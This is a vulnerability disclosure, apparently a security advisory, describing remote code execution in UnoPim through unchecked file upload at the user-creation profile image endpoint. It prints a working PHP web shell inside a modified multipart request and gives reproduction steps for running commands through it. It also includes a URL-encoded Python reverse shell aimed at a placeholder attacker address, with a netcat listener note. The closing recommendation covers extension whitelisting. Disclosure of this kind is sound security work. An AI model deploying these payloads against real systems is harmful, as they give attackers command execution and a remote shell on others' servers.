summary: "UnoPim vulnerable to remote code execution through Arbitrary File upload\n### Summary:\n\
  Affected Functionality: **Image upload at User creation**\nEndpoint: `/admin/settings/users/create`\n\
  \n### Details\nThe image upload at the user creation feature performs only client side file\
  \ type validation.\nA user can capture the request by uploading an image, capture the request\
  \ through a Proxy like Burp suite. \nMake changes to the file extension and content. The .php\
  \ file when accessed through the link runs the code we provided inside the file.\n\nModified\
  \ part of the multipart request body:\n```\nContent-Disposition: form-data; name=\"image[]\"\
  ; filename=\"poc.php\"\nContent-Type: application/x-php\n\n<?php if(isset($_REQUEST['cmd'])){\
  \ $cmd = ($_REQUEST['cmd']); system($cmd); die; }?>\n```\n\n### PoC\n 1. Upload an image file\
  \ as profile picture during user creation , now capture the request and modify.\n File content:\
  \ ```<?php if(isset($_REQUEST['cmd'])){ $cmd = ($_REQUEST['cmd']); system($cmd); die; }?>```\n\
  \ File name: poc.php\n Content-Type can be any, doesn't matter. \n 2. Access the uploaded\
  \ file e.g. http://localhost:8000/storage/admins/21/poc.php?cmd=ls\n // pass the command to\
  \ run as parameter value for `cmd`, example running `ls` command on the system\n\nLikewise\
  \ the following reverse shell code ( [reverse shell of other languages](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)\
  \ ) can be executed to create a connection to attacker controlled system\nCommand:\n```\n\
  python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"\
  YOUR_IP\",7000));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import%20pty;%20pty.spawn(\"\
  sh\")%27\n```\n// Make sure `netcat` is running on port `7000`\n// change `IP` accordingly\n\
  \n### Impact\nEvery user in the dashboard is allowed to change their profile picture, thus\
  \ allowing any of these users to execute malicious actions at the Server level. Usually a\
  \ server might host multiple applications, allowing execution of system commands allows complete\
  \ control of the system. The impact of an RCE vulnerability can be full system compromise,\
  \ access to database and filesystem, access other sensitive devices on the network.\nPlease\
  \ see the POC video: https://drive.proton.me/urls/PH1ESMKHMW#4Vxb2KNu3tmn\n\n\n### Recommendation:\n\
  Extension Validation: Whitelist allowed extensions. ( use `endswith()` check rather than `contains()`\
  \ as an attacker can bypass such a restriction with filename: poc.jpg.php"
